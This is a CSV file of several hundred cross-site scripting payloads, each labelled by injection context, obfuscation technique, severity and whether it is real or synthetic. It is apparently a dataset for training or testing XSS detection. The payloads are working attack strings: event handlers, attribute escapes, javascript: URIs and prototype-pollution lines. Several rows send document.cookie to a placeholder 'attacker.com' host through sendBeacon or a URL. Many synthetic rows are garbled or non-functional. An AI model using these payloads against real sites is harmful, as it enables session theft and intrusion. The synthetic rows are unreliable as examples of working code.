payload,context,technique,severity,length,source
{{constructor.constructor(%27prompt(1)%27)()}},template_injection,synthetic,medium,46,synthetic
<time id=x tabindex=1 onactivate=alert(1)></time>,tag_injection,none,medium,49,real
"%3Ciframe ontouchstart=prompt(String.fromCharCode(88,83,83)) ontouchstart=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,114,synthetic
"s&#101;tTim&#101;out(""prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"",0)",dom_sink,synthetic,medium,90,synthetic
"onsubmit=j&#97;v&#97;script:confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,75,synthetic
"<link rel=import href=""data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",js_uri,none,medium,85,real
"""><img src=x onhashchange=\u0061lert('XSS')>",attribute_escape,synthetic,low,44,synthetic
"<!--><animatetransform ondragover=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,77,synthetic
' %3E%3Csvg onwebkittransitionend=confirm(location.hash)%3E,attribute_escape,synthetic,medium,59,synthetic
onscrollend=console.log(location.hash),event_handler,synthetic,medium,38,synthetic
' %3E%3Csvg onpromptdismiss=alert(document.domain)%3E,attribute_escape,synthetic,medium,53,synthetic
"oninput=alert&#40;String.fromCharCode(88,83,83)&#41;",event_handler,synthetic,high,52,synthetic
""" ><svG oNenDed=coNsoLe.Log(doCumEnt.doMaiN)>",attribute_escape,synthetic,medium,45,synthetic
"<meter onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</meter>",tag_injection,none,medium,68,real
"""><img src=x onb&#101;gin=confirm(1)>",attribute_escape,synthetic,medium,37,synthetic
""" oNpoIntErrAwuPdaTe=ConFirM(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape,synthetic,high,61,synthetic
<datalist id=x tabindex=1 ondeactivate=alert(1)></datalist><input id=y autofocus>,tag_injection,none,medium,81,real
__proto__[%22onbeforepaste%22]=eval(localStorage.getItem(%27token%27)),dom_sink,synthetic,high,70,synthetic
 onMouSeeNteR=aLerT('XSS'),event_handler,synthetic,medium,26,synthetic
"<element onclick=""alert(1)"">AnonKryptiQuz</element>",tag_injection,none,medium,51,real
onload=\u0061lert/*x*/(document.domain),event_handler,synthetic,low,39,synthetic
onpointermove=javascript:console.log(document.domain),event_handler,synthetic,medium,53,synthetic
' %3E%3Csvg onmousedown=alert(location.hash)%3E,attribute_escape,synthetic,medium,47,synthetic
<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>,tag_injection,none,medium,53,real
%22><img src=x ontouchend=console.log(1)>,attribute_escape,synthetic,medium,41,synthetic
Google Search: `//google.com/complete/search?client=chrome&jsonp=alert(1);,event_handler,none,medium,74,real
"<address oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</address>",tag_injection,none,medium,66,real
"""><img src=x onerror=prompt(document.cookie);>",dom_sink,none,high,46,real
"__proto__[""onselect""]=alert(document.cookie+'&loc='+location.href)",dom_sink,synthetic,high,66,synthetic
`><Img srC=x onSeaRch=prOmpT(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,46,synthetic
"(new Function(""alert(document.cookie+'&loc='+location.href)""))();",dom_sink,synthetic,high,65,synthetic
<scr	ipt>Function('alert(1)')();</scr	ipt>,script_injection,synthetic,medium,42,synthetic
"""><img src:x onerror=prompt(document.domain);>",dom_sink,none,medium,46,real
<script>Function('alert(1)')();</script>,script_injection,synthetic,medium,40,synthetic
"""><Img srC=x onScrOllSnaPchAngE=cOnsOle.loG(1)>",attribute_escape,synthetic,medium,47,synthetic
"__proto__[""onp&#97;g&#101;show""]=&#101;v&#97;l(docum&#101;nt.cooki&#101;)",dom_sink,synthetic,low,73,synthetic
"%3Cscript
%3Econsole.log(location.hash)%3C/script%3E",script_injection,synthetic,medium,52,synthetic
<noScrIpt onPasTe=ConFirM(lOcaTioN.hAsh) oNpaSte=coNfiRm(LocAtiOn.HasH)>,tag_injection,synthetic,medium,72,synthetic
<body ontouchstart=alert(1)> // Triggers when a finger touch the screen,tag_injection,none,medium,71,real
%3Cxmp ontransitionend=alert(location.hash) ontransitionend=alert(location.hash)%3E,tag_injection,synthetic,medium,83,synthetic
"' ><svG oNcoPy=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,52,synthetic
"__proto__[""onmousedown""]=alert(document.cookie+'&loc='+location.href)",dom_sink,synthetic,high,69,synthetic
 onblur=console.log(1),event_handler,synthetic,medium,22,synthetic
<q onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
"<a href=""\x1Fjavascript:javascript:alert(3690)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
<iframe onsecuritypolicyviolation=confirm(%27XSS%27)>,tag_injection,synthetic,medium,53,synthetic
"<meter onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</meter>",tag_injection,none,medium,71,real
<template onended=prompt('XSS')/>,tag_injection,synthetic,medium,33,synthetic
"<big onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</big>",tag_injection,none,medium,81,real
"<iframe src=""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""></iframe>",js_uri,html_entity,low,247,real
\' onp&#97;g&#101;show=consol&#101;.log('XSS')//,attribute_escape,synthetic,low,48,synthetic
"<style>:target {transform: rotate(180deg);}</style><style id=x style=""transition:transform 2s"" ontransitionrun=print()></style>",tag_injection,none,low,127,real
""" ><svg onk&#101;ypr&#101;ss=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,86,synthetic
"<abbr draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",tag_injection,none,medium,86,real
"<multicol onclick=""alert(1)"">AnonKryptiQuz</multicol>",tag_injection,none,medium,53,real
"<scr	ipt
>console.log(document.domain)</scr	ipt>",script_injection,synthetic,medium,48,synthetic
"<link draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</link>",tag_injection,none,medium,86,real
"<select draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</select>",tag_injection,none,medium,70,real
' onk&#101;ydown=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,low,56,synthetic
"<body onfocusout=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,64,synthetic
<area onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</area>,tag_injection,none,medium,74,real
"<form id=""test"" /><button form=""test"" formaction=""javascript:alert(123)"">TESTHTML5FORMACTION",js_uri,none,medium,92,real
"<font oncut=""alert(1)"" contenteditable>AnonKryptiQuz</font>",tag_injection,none,medium,59,real
"""><BodY oNfoCusOut=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,high,57,synthetic
""" onmouseover=alert('XSS') x=""",attribute_escape,synthetic,medium,30,synthetic
<m&#101;t&#97; ontr&#97;nsitionst&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ontr&#97;nsitionst&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,143,synthetic
'><img src=x onscrollsnapchange=alert('XSS')>,attribute_escape,synthetic,medium,45,synthetic
"<canvas onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</canvas>",tag_injection,none,medium,85,real
"ondr&#97;gov&#101;r=prompt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler,synthetic,low,74,synthetic
"<div draggable=""true"" contenteditable>drag me</div><rtc ondrop=alert(1) contenteditable>drop here</rtc>",tag_injection,none,medium,103,real
<arEa OncLosE=pRomPt(1)>,tag_injection,synthetic,medium,24,synthetic
<teMplAte onEndEd=ProMpt('XSS')/>,tag_injection,synthetic,medium,33,synthetic
"<td onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</td>",tag_injection,none,medium,65,real
<!--><AniMatEmoTioN oNanImaTioNitEraTioN=cOnsOle.loG('XSS')>,tag_injection,synthetic,medium,60,synthetic
"(neW FUncTioN(""ConSolE.lOg('//AttAckEr.Com/?c='+DocUmeNt.CooKie)""))();",dom_sink,synthetic,high,70,synthetic
<script>prompt`document.domain`</script>,script_injection,synthetic,low,40,synthetic
<%= confirm document.cookie %>,template_injection,synthetic,high,30,synthetic
 onp&#97;g&#101;r&#101;v&#101;&#97;l=confirm(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,70,synthetic
&quot; onpagehide=prompt(document.domain) x=&quot;,attribute_escape,synthetic,medium,50,synthetic
<select onpointerdown=alert(1) style=display:block>AnonKryptiQuz</select>,tag_injection,none,medium,73,real
"OnpAgeHidE=cOnsOle.loG&#40;StrIng.frOmCHarCodE(88,83,83)&#41;",event_handler,synthetic,high,61,synthetic
<figcaption onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,60,real
"loc&#97;tion=""j&#97;v&#97;script:confirm(docum&#101;nt.cooki&#101;)""",dom_sink,synthetic,medium,68,synthetic
' onsecuritypolicyviolation=console.log('XSS') ',attribute_escape,synthetic,medium,48,synthetic
&quot; onend=confirm(%27XSS%27) x=&quot;,attribute_escape,synthetic,medium,40,synthetic
"java
script:alert(1)",js_uri,synthetic,medium,20,synthetic
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=pRomPt(1)>"")",dom_sink,synthetic,medium,47,synthetic
"<a href=""/*"">*/)});function+__MobileAppList(){alert(1)}//>",attribute_escape,comment_injection,medium,58,real
""" ><svG oNgoTpoIntErcAptUre=prOmpT('XSS')>",attribute_escape,synthetic,medium,42,synthetic
"<style>:target {color: red;}</style><var id=x style=""transition:color 10s"" ontransitioncancel=print()></var>",tag_injection,none,low,108,real
"<s onmouseleave=""alert(1)"">AnonKryptiQuz</s>",tag_injection,none,medium,44,real
"""><img src=javascript:while([{}]);>",js_uri,none,low,35,real
"<style>@keyframes slidein {}</style><pre style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></pre>",tag_injection,none,medium,160,real
"&quot; onstalled=console.log(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,68,synthetic
"%22 onmouseover=confirm(String.fromCharCode(88,83,83)) x=%22",attribute_escape,synthetic,high,60,synthetic
""" ><svg onbeforepaste=\u0061lert(1)>",attribute_escape,synthetic,low,36,synthetic
<a onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</a><input value=clickme>,tag_injection,none,medium,93,real
"<div id=""div1""><input value=""``onmouseover=javascript:alert(9601)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>",dom_sink,none,high,198,real
<deTaiLs OnrEpeAt=ProMpt(1)>,tag_injection,synthetic,medium,28,synthetic
"__proto__[""onblur""]=confirm(document.cookie)",dom_sink,synthetic,high,44,synthetic
"<img src=x onerror=""eval('\141lert(1)')""/>",dom_sink,encoding,low,42,real
"<custom tags draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</custom tags>",tag_injection,none,medium,100,real
<svG oNprOmpTdiSmiSs=AleRt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,42,synthetic
<template onreset=alert(location.hash)>,tag_injection,synthetic,medium,39,synthetic
%27 ><svg ontouchmove=alert(location.hash)>,attribute_escape,synthetic,medium,43,synthetic
"<nav draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</nav>",tag_injection,none,medium,84,real
\' ontouchend=\u0061lert('XSS')//,attribute_escape,synthetic,low,33,synthetic
"&quot; onp&#97;g&#101;sw&#97;p=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape,synthetic,low,96,synthetic
"&lt;XML SRC=\""xssAnonKryptiQuz&#46;xml\"" ID=I&gt;&lt;/XML&gt;",generic,html_entity,low,61,real
"<button draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</button>",tag_injection,none,medium,68,real
<picture onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</picture><input value=clickme>,tag_injection,none,medium,105,real
"<frame draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</frame>",tag_injection,none,medium,68,real
%3Csvg onbeforecopy=prompt(document.domain) onbeforecopy=prompt(document.domain)%3E,tag_injection,synthetic,medium,83,synthetic
"\"" OnsCroLlsNapChaNge=alErt('XSS')//",attribute_escape,synthetic,medium,36,synthetic
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationend=""alert(1)""></body>",tag_injection,none,medium,93,real
"LocAtiOn.HreF=""JavAscRipT:pRomPt(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)""",dom_sink,synthetic,high,72,synthetic
'><img src=x onfocusout=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,55,synthetic
"<xmP oNfoCusOut=prOmpT(STriNg.FroMChArCOde(88,83,83)) OnfOcuSouT=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,103,synthetic
"<datalist onmousedown=""alert(1)"">AnonKryptiQuz</datalist>",tag_injection,none,medium,57,real
"%22><img src=x onfocus=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,66,synthetic
<animatemotion/ondblclick=console.log(1)>,tag_injection,synthetic,medium,41,synthetic
<tfoot onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</tfoot><input value=clickme>,tag_injection,none,medium,110,real
onscroll&#101;nd=consol&#101;.log/*x*/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,61,synthetic
onpointerrawupdate=javascr	ipt:prompt('XSS'),event_handler,synthetic,medium,44,synthetic
"__proto__[""ons&#101;curitypolicyviol&#97;tion""]=&#97;l&#101;rt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,163,synthetic
"<animatetransform x=y ondragover=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,76,synthetic
<body ontouchmove=alert(1)>,tag_injection,none,medium,27,real
onpageshow=\u0061lert/*x*/('XSS'),event_handler,synthetic,low,33,synthetic
"<dl oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,96,real
"	ongotpointercapture=console.log(String.fromCharCode(88,83,83))",event_handler,synthetic,high,63,synthetic
`><img src=x ons&#101;&#97;rch=&#97;l&#101;rt('XSS')>,attribute_escape,synthetic,low,53,synthetic
<td x=y onw&#101;bkit&#97;nim&#97;tion&#101;nd=prompt('XSS')>,tag_injection,synthetic,medium,61,synthetic
"' ><svg ontransitionstart=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
"\%22 onanimationiteration=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,66,synthetic
"&lt;A HREF=\""http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,110,real
' ><svg onp&#97;us&#101;=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,59,synthetic
"<noscript draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</noscript>",tag_injection,none,medium,74,real
"<object classid=""clsid:..."" codebase=""javascript:document.vulnerable=true;"">",dom_sink,none,low,76,real
<select onpointerout=alert(1) style=display:block>AnonKryptiQuz</select>,tag_injection,none,medium,72,real
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationstart=""alert(1)""></address>",tag_injection,none,medium,101,real
"%22><img src=x oninvalid=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,64,synthetic
&quot; onpopst&#97;t&#101;=confirm(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape,synthetic,medium,69,synthetic
"<pre oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97,real
"(n&#101;w Function(""confirm('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)""))();",dom_sink,synthetic,medium,94,synthetic
"<template
ondragenter=alert('XSS')>",tag_injection,synthetic,medium,35,synthetic
"""%3E%3Cimg src=x ongotpointercapture=alert(1)%3E",attribute_escape,synthetic,medium,48,synthetic
"<style>:target {transform: rotate(180deg);}</style><output id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></output>",tag_injection,none,medium,130,real
""" ><svG oNdrOp=ConFirM(1)>",attribute_escape,synthetic,medium,26,synthetic
\%27 onbeforetoggle=console.log(%27XSS%27)//,attribute_escape,synthetic,medium,44,synthetic
<svg id=alert(1) onload=eval(id)>,dom_sink,encoding,medium,33,real
%27><img src=x ongotpointercapture=alert(1)>,attribute_escape,synthetic,medium,44,synthetic
<Img Src=OnAnonKryptiQuz OnError=confirm(1337)>,tag_injection,case_variation,medium,47,real
&quot; onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape,synthetic,low,83,synthetic
 onlo&#97;d=prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,44,synthetic
""" onfocus=prompt(document.domain) autofocus=""",attribute_escape,synthetic,medium,45,synthetic
"'><img src=x onprompt&#97;ction=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,80,synthetic
""" ><svG oNdrAgoVer=prOmpT(1)>",attribute_escape,synthetic,medium,29,synthetic
%3Cdialog onpagehide=console.log(1)/%3E,tag_injection,synthetic,medium,39,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onw&#101;bkittr&#97;nsition&#101;nd"":XMLHttpR&#101;qu&#101;st})",dom_sink,synthetic,high,95,synthetic
žscriptualert(EXSSE)ž/scriptu,generic,none,medium,29,real
"<tr onmouseover=""alert(1)"">AnonKryptiQuz</tr>",tag_injection,none,medium,45,real
"<link id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></link>",tag_injection,none,medium,84,real
""" %3E%3Csvg onended=prompt('XSS')%3E",attribute_escape,synthetic,medium,36,synthetic
"' oNbeForEpaSte=prOmpT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,high,55,synthetic
%3Cset x=y onpointermove=confirm(location.hash)%3E,tag_injection,synthetic,medium,50,synthetic
<hgroup id=x tabindex=1 onactivate=alert(1)></hgroup>,tag_injection,none,medium,53,real
<svg%0Aonauxclick=0;[1].some(confirm)//,tag_injection,url_encoding,low,39,real
"'><img src=x ontransitionstart=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,70,synthetic
%27 ><svg onanimationend=confirm(location.hash)>,attribute_escape,synthetic,medium,48,synthetic
<X OnXxx=1,tag_injection,case_variation,low,10,real
\%27 ongestureend=alert(1)//,attribute_escape,synthetic,medium,28,synthetic
<listing x=y ontr&#97;nsitionst&#97;rt=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,73,synthetic
'te' - alert('-') - 'xt';,attribute_escape,none,medium,25,real
%22 onmouseover=console.log(%27XSS%27) %22,attribute_escape,synthetic,medium,42,synthetic
"\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=\'",script_injection,encoding|case_variation,high,74,real
"<style>@keyframes slidein {}</style><animatemotion style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></animatemotion>",tag_injection,none,medium,180,real
"<body onmouseleave=""alert(1)"">AnonKryptiQuz</body>",tag_injection,none,medium,50,real
<param onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</param><input value=clickme>,tag_injection,none,medium,101,real
OnaNimAtiOneNd=AleRt&#40;1&#41;,event_handler,synthetic,low,31,synthetic
"<style>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>",tag_injection,none,medium,158,real
<command id=x tabindex=1 onfocusin=alert(1)></command>,tag_injection,none,medium,54,real
%22 onmouseover=console.log(document.domain) x=%22,attribute_escape,synthetic,medium,50,synthetic
' oNpoIntEruP=aLerT(1) ',attribute_escape,synthetic,medium,24,synthetic
 onblur=consol&#101;.log(1),event_handler,synthetic,low,27,synthetic
<!--><form onw&#101;bkit&#97;nim&#97;tion&#101;nd=prompt('XSS')>,tag_injection,synthetic,medium,64,synthetic
<table onpointerdown=alert(1) style=display:block>AnonKryptiQuz</table>,tag_injection,none,medium,71,real
"<applet ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</applet>",tag_injection,none,medium,93,real
j&#97;v&#97;script:&#97;l&#101;rt/***/(1),js_uri,synthetic,low,41,synthetic
"__proto__[""onfullscreenchange""]=alert(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink,synthetic,high,93,synthetic
"pods/ppt.aspx?&fileName=')}, 1000); alert('AnonKryptiQuz')://",generic,none,medium,61,real
ondblclick=console.log&#40;1&#41;,event_handler,synthetic,low,33,synthetic
<td onend=console.log(document.domain) onend=console.log(document.domain)>,tag_injection,synthetic,medium,74,synthetic
'%3E%3Cimg src=x onfocusout=alert(location.hash)%3E,attribute_escape,synthetic,medium,51,synthetic
"JAVASCRIPT:cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))",js_uri,synthetic,high,53,synthetic
"<form onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></form>",tag_injection,none,medium,281,real
""" ><svG oNtrAnsItiOneNd=AleRt(1)>",attribute_escape,synthetic,medium,33,synthetic
"<animatetransform draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</animatetransform>",tag_injection,none,medium,110,real
/</script>'>alert(1)/*<script/1=',script_injection,none,medium,33,real
'><scr'+'ipt>alert(document.cookie)</scr'+'ipt><b><!--,dom_sink,none,high,54,real
"<rb onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></rb>",tag_injection,none,medium,277,real
%22%2525%2F%28%29%2C%20alert%281%29%3B%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3B%3E%3Cscript%3E,generic,url_encoding,medium,99,real
"onw&#101;bkittr&#97;nsition&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,90,synthetic
"<a href=""jav&#97ascript:javascript:alert(2440)"">test1</a>",js_uri,html_entity,medium,57,real
"<main onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</main>",tag_injection,none,medium,64,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;)>"")",dom_sink,synthetic,low,96,synthetic
"%27 onpromptaction=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,high,61,synthetic
"<listing
onk&#101;yup=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,low,60,synthetic
"${{'&#97;l&#101;rt(docum&#101;nt.dom&#97;in)'.r&#101;pl&#97;c&#101;('&#97;l&#101;rt(docum&#101;nt.dom&#97;in)','')}}",template_injection,synthetic,low,116,synthetic
"<option draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</option>",tag_injection,none,medium,70,real
"<td oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,96,real
__proto__[%22ongesturestart%22]=eval(document.cookie),dom_sink,synthetic,high,53,synthetic
"<a href=""jav&#97ascript:javascript:alert(1)"">AnonKryptiQuz1</a>",js_uri,html_entity,medium,63,real
"<div draggable=""true"" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable>drop here</noembed>",tag_injection,none,medium,115,real
"%27 ><svg onfocus=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationstart=""alert(1)""></samp>",tag_injection,none,medium,95,real
"__pRotO__[""oNpaUse""]=FetCh(NavIgaTor.seNdBEacOn('//AttAckEr.Com',dOcuMenT.cOokIe))",dom_sink,synthetic,high,82,synthetic
<liStiNg	OntRanSitIonStaRt=ConFirM(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,52,synthetic
"""%3E%3Cimg src=x ontouchmove=console.log(document.domain)%3E",attribute_escape,synthetic,medium,60,synthetic
{{prompt|constructor:docum&#101;nt.cooki&#101;}},template_injection,synthetic,low,48,synthetic
""" %3E%3Csvg onkeypress=alert(1)%3E",attribute_escape,synthetic,medium,34,synthetic
"<input4 draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</input4>",tag_injection,none,medium,90,real
